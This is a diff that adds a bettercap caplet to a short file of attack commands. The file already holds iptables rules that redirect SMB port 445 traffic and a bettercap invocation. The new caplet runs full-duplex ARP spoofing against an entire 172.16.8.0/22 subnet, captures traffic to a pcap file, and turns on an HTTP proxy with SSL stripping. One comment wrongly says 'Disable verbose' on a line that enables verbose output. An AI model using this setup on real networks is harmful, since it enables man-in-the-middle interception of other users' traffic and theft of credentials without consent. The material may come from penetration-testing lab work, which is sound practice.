@@ -5,3 +5,24 @@ sudo iptables -t nat -A PREROUTING -p tcp --dport 445 -j DNAT --to-destination 1
 sudo iptables -t nat -D PREROUTING -p tcp --dport 445 -j DNAT --to-destination 192.168.x.x:445
 
 sudo bettercap -iface eth0 -eval 'set net.sniff.output test5.pcap' -caplet arpspoof_sniff.cap
+
+
+#caplet file
+
+# Enable ARP spoofing for the subnet
+set arp.spoof.targets 172.16.8.0/22              # Target the entire subnet
+set arp.spoof.fullduplex true                    # Enable bidirectional spoofing
+arp.spoof on                                     # Start ARP spoofing
+
+# Enable packet sniffing
+set net.sniff.verbose true                      # Disable verbose sniffing logs (optional)
+set net.sniff.output test5.pcap                  # File to save sniffed packets
+net.sniff on                                     # Start sniffing
+
+# Optional: Enable additional modules for potential attacks
+set http.proxy.sslstrip true                     # Enable SSL stripping on HTTP proxy (optional)
+http.proxy on                                    # Start HTTP proxy (optional)
+
+# Optional: Enable Bettercap's interactive real-time dashboard
+ui.banner on                                     # Show a banner
+ui.update on                                     # Enable UI updates
